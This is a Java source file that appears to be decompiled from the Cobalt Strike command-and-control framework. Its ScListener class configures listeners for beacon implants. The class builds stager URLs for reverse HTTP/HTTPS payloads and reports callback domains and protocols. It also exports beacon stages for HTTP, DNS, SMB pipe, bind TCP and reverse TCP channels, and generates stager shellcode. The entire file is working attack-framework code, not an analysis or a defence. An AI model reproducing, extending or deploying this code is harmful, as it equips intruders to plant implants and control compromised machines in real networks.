package common;

import aggressor.AggressorClient;
import aggressor.DataManager;
import aggressor.DataUtils;
import beacon.BeaconPayload;
import c2profile.Profile;
import dialog.DialogUtils;

import java.util.HashMap;
import java.util.Map;

import stagers.Stagers;

public class ScListener {
    protected Map options;

    protected Profile c2profile;

    protected byte[] pubkey;

    protected ListenerConfig config;

    public ScListener(AggressorClient aggressorClient, Map map) {
        this(aggressorClient.getData(), map);
    }

    public ScListener(DataManager dataManager, Map map) {
        this(DataUtils.getProfile(dataManager), DataUtils.getPublicKey(dataManager), map);
    }

    public ScListener(Profile profile, byte[] arrby, Map map) {
        this.options = map;
        this.c2profile = profile.getVariantProfile(getVariantName());
        this.pubkey = arrby;
        this.config = new ListenerConfig(this.c2profile, this);
    }

    public byte[] getPublicKey() {
        return this.pubkey;
    }

    public String getVariantName() {
        return DialogUtils.string(this.options, "profile");
    }

    public String getHostHeader() {
        return DialogUtils.string(this.options, "althost");
    }

    public Profile getProfile() {
        return this.c2profile;
    }

    public String getName() {
        return DialogUtils.string(this.options, "name");
    }

    public String getPayload() {
        return DialogUtils.string(this.options, "payload");
    }

    public ListenerConfig getConfig() {
        return this.config;
    }

    public int getBindPort() {
        if (!DialogUtils.isNumber(this.options, "bindto")) {
            return getPort();
        }
        return DialogUtils.number(this.options, "bindto");
    }

    public boolean isLocalHostOnly() {
        return DialogUtils.bool(this.options, "localonly");
    }

    public int getPort() {
        return DialogUtils.number(this.options, "port");
    }

    public String getStagerHost() {
        return DialogUtils.string(this.options, "host");
    }

    public String getCallbackHosts() {
        return DialogUtils.string(this.options, "beacons");
    }

    public String getCallbackHost() {
        String[] arrstring = getCallbackHosts().split(",\\s*");
        if (arrstring.length == 0) {
            return "";
        }
        return arrstring[0];
    }

    public String getProxyString() {
        return DialogUtils.string(this.options, "proxy");
    }

    public void setProxyString(String string) {
        this.options.put("proxy", string);
    }

    public String getPipeName() {
        return DialogUtils.string(this.options, "port");
    }

    public String getPipeName(String string) {
        return "\\\\" + string + "\\pipe\\" + getPipeName();
    }

    public String getStagerURI(String string) {
        if ("windows/beacon_http/reverse_http".equals(getPayload())) {
            String str = "x86".equals(string)
                    ? getConfig().getURI() : getConfig().getURI_X64();
            return "http://" + getStagerHost() + ":" + getPort() + str;
        }
        if ("windows/beacon_https/reverse_https".equals(getPayload())) {
            String str = "x86".equals(string)
                    ? getConfig().getURI() : getConfig().getURI_X64();
            return "https://" + getStagerHost() + ":" + getPort() + str;
        }
        if ("windows/foreign/reverse_http".equals(getPayload()) && "x86".equals(string)) {
            String str = CommonUtils.MSFURI();
            return "http://" + getStagerHost() + ":" + getPort() + str;
        }
        if ("windows/foreign/reverse_https".equals(getPayload()) && "x86".equals(string)) {
            String str = CommonUtils.MSFURI();
            return "https://" + getStagerHost() + ":" + getPort() + str;
        }
        return "";
    }

    public boolean hasStager() {
        return hasStager("x86");
    }

    public Map toMap() {
        return new HashMap(this.options);
    }

    public Map getC2Info(String string) {
        HashMap hashMap = new HashMap();
        hashMap.put("bid", string);
        hashMap.put("domains", getCallbackHosts());
        hashMap.put("port", getPort() + "");
        Map map = CommonUtils.toMap("windows/beacon_dns/reverse_dns_txt", "dns",
                "windows/beacon_http/reverse_http", "http",
                "windows/beacon_https/reverse_https", "https");
        hashMap.put("proto", map.get(getPayload()));
        return hashMap;
    }

    public boolean isForeign() {
        if ("windows/foreign/reverse_http".equals(getPayload())) {
            return true;
        }
        return "windows/foreign/reverse_https".equals(getPayload());
    }

    public boolean hasStager(String string) {
        if ("windows/foreign/reverse_http".equals(getPayload())) {
            return "x86".equals(string);
        }
        if ("windows/foreign/reverse_https".equals(getPayload())) {
            return "x86".equals(string);
        }
        if ("windows/beacon_bind_pipe".equals(getPayload())) {
            return false;
        }
        if ("windows/beacon_bind_tcp".equals(getPayload())) {
            return false;
        }
        if ("windows/beacon_reverse_tcp".equals(getPayload())) {
            return false;
        }
        if ("windows/beacon_extc2".equals(getPayload())) {
            return false;
        }
        if ("windows/beacon_dns/reverse_dns_txt".equals(getPayload())) {
            return this.c2profile.option(".host_stage") && "x86".equals(string);
        }
        if ("windows/beacon_extc2".equals(getPayload())) {
            return false;
        }
        return this.c2profile.option(".host_stage");
    }

    public byte[] getPayloadStager(String string) {
        return Stagers.shellcode(this, getPayload(), string);
    }

    public byte[] getPayloadStagerLocal(int n, String string) {
        return Stagers.shellcodeBindTcp(this, n, string);
    }

    public byte[] getPayloadStagerPipe(String string1, String string2) {
        return Stagers.shellcodeBindPipe(this, string1, string2);
    }

    protected String getFile(String string1, String string2) {
        if ("x86".equals(string2)) {
            return "resources/" + string1 + ".dll";
        }
        return "resources/" + string1 + ".x64.dll";
    }

    public byte[] export(String string) {
        return export(string, 0);
    }

    public byte[] export(String string, int n) {
        if ("windows/foreign/reverse_http".equals(getPayload())) {
            return getPayloadStager(string);
        }
        if ("windows/foreign/reverse_https".equals(getPayload())) {
            return getPayloadStager(string);
        }
        if ("windows/beacon_http/reverse_http".equals(getPayload())) {
            return new BeaconPayload(this, n)
                    .exportBeaconStageHTTP(getPort(), getCallbackHosts(), false, false, string);
        }
        if ("windows/beacon_https/reverse_https".equals(getPayload())) {
            return (new BeaconPayload(this, n))
                    .exportBeaconStageHTTP(getPort(), getCallbackHosts(), false, true, string);
        }
        if ("windows/beacon_dns/reverse_dns_txt".equals(getPayload())) {
            return (new BeaconPayload(this, n))
                    .exportBeaconStageDNS(getPort(), getCallbackHosts(), true, false, string);
        }
        if ("windows/beacon_bind_pipe".equals(getPayload())) {
            return (new BeaconPayload(this, n))
                    .exportSMBStage(string);
        }
        if ("windows/beacon_bind_tcp".equals(getPayload())) {
            return (new BeaconPayload(this, n))
                    .exportBindTCPStage(string);
        }
        if ("windows/beacon_reverse_tcp".equals(getPayload())) {
            return (new BeaconPayload(this, n))
                    .exportReverseTCPStage(string);
        }
        AssertUtils.TestFail("Unknown payload '" + getPayload() + "'");
        return new byte[0];
    }

    public String toString() {
        if ("windows/beacon_bind_tcp".equals(getPayload())) {
            if (isLocalHostOnly()) {
                return getPayload() + " (127.0.0.1:" + getPort() + ")";
            }
            return getPayload() + " (0.0.0.0:" + getPort() + ")";
        }
        if ("windows/beacon_bind_pipe".equals(getPayload())) {
            return getPayload() + " (\\\\.\\pipe\\" + getPipeName() + ")";
        }
        if ("windows/beacon_reverse_tcp".equals(getPayload())) {
            return getPayload() + " (" + getStagerHost() + ":" + getPort() + ")";
        }
        if (isForeign()) {
            return getPayload() + " (" + getStagerHost() + ":" + getPort() + ")";
        }
        return getPayload() + " (" + getCallbackHost() + ":" + getPort() + ")";
    }
}
